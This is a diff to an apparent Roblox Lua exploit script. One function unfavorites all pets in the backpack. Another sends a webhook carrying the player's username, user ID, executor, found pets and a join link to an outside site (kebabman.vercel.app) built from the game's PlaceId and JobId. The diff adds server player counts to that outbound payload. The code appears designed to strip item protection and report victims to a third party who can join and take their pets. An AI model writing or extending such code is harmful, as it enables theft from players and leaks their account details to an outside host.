@@ -92,7 +92,7 @@ local function unfavoriteAllPetsInBackpack()
             end)
             if success and isPet then
                 favoriteRemote:FireServer(item)
-                task.wait(0.6)
+                task.wait(1)
             end
         end
     end
@@ -139,6 +139,9 @@ local function sendWebhookNotification(foundPetsData)
     local userId = LocalPlayer.UserId
     local executor = getExecutorName()
     
+    local currentPlayers = #Players:GetPlayers()
+    local maxPlayers = Players.MaxPlayers
+    
     local joinLink = string.format("https://kebabman.vercel.app/start?placeId=%d&gameInstanceId=%s", game.PlaceId, game.JobId)
     
     local playerInfoValue = string.format("```\nUsername: %s\nDisplay: %s\nUser ID: %d\nExecutor: %s\n```",
@@ -160,6 +163,8 @@ local function sendWebhookNotification(foundPetsData)
     end
     local petsValue = "```\n" .. table.concat(formattedPetLines, "\n") .. "\n```"
 
+    local serverInfoValue = string.format("`%d / %d` players", currentPlayers, maxPlayers)
+
     local embedColor = 65280
     
     local payload = {
@@ -177,6 +182,11 @@ local function sendWebhookNotification(foundPetsData)
                     {
                         name = "🌴 Found Pets",
                         value = petsValue,
+                        inline = false
+                    },
+                    {
+                        name = "📊 Server Info",
+                        value = serverInfoValue,
                         inline = false
                     },
                     {
